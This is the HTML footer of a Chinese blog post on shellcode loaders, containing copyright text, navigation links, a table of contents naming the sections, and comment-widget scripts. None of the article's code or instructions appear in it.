+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LuckyFuture</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://luckyfuture.top/ShellcodeLoader.html">http://luckyfuture.top/ShellcodeLoader.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/%E7%9F%A5%E8%AF%86%E5%85%B1%E4%BA%AB%E8%AE%B8%E5%8F%AF%E5%8D%8F%E8%AE%AE" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://luckyfuture.top" target="_blank">Lucky Future的技术栈</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328172923202.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/BypassAVLearning.html"><img class="prev-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328172923202.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">从0开始写ShellCode加载器0x1-Windows内存操作api</div></div></a></div><div class="next-post pull-right"><a href="/config-clash-on-linux.html"><img class="next-cover" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220122221500450.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">在腾讯云上配置clash代理访问Github</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Waline</span><span class="switch-btn"></span><span class="second-comment">Disqusjs</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#C-C-%E5%8A%A0%E8%BD%BDshellcode"><span class="toc-number">1.</span> <span class="toc-text">C&#x2F;C++加载shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.</span> <span class="toc-text">函数指针执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">申请动态内存加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.3.</span> <span class="toc-text">内联汇编加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Go%E8%AF%AD%E8%A8%80%E5%8A%A0%E8%BD%BDshellcode"><span class="toc-number">2.</span> <span class="toc-text">Go语言加载shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2"><span class="toc-number">3.</span> <span class="toc-text">shellcode变形免杀初探</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328172923202.png)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By LuckyFuture</div><div class="framework-info"><span>Powered by </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">本站部署在<a target="_blank" rel="noopener" href="https://pages.github.com/">GitHub Pages</a>，由<a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">jsDelivr</a>和<a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-cn/">CloudFlare</a>提供CDN加速和安全防护</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadWaline () {
+  function initWaline () {
+    let initData = {
+      el: '#waline-wrap',
+      serverURL: 'https://hexo-comments.vercel.app/',
+      avatar: 'mp',
+      path: location.pathname,
+      emojiCDN: '',
+      emojiMaps: "",
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const waline = new Waline(initData)
+  }
+
+  if (typeof Waline === 'function') initWaline() 
+  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script><script>function loadDisqusjs () {
+  function addDisqusjsCSS () {
+    const ele = document.createElement('link')
+    ele.rel = 'stylesheet'
+    ele.href= 'https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css'
+    document.getElementsByTagName('head')[0].appendChild(ele)
+  }
+
+  function initDisqusjs () {
+    window.DISQUS = null
+    new DisqusJS({
+      shortname: 'luckyfuture',
+      siteName: '',
+      identifier: 'ShellcodeLoader.html',
+      url: 'http://luckyfuture.top/ShellcodeLoader.html',
+      title: '各语言ShellcodeLoader初探',
+      api: 'https://disqus.skk.moe/disqus/',
+      apikey: 'zkchdXXUQFql5yBCEoFFYVoGrCrqnkDmWuirRxGPu6qmzj0i8lHYLa2HiWNus9DQ',
+      nocomment: '',
+      admin: 'LuckyFuture',
+      adminLabel: ''
+    });
+  }
+
+  window.disqusReset = initDisqusjs
+
+  if (window.disqusJsLoad) initDisqusjs()
+  else {
+    addDisqusjsCSS()
+    getScript('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js').then(initDisqusjs)
+    window.disqusJsLoad = true
+  }
+}
+
+if ('Waline' === 'Disqusjs' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqusjs)
+  else loadDisqusjs()
+}
+else {
+  function loadOtherComment () {
+    loadDisqusjs()
+  }
+}
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script></div></body></html>
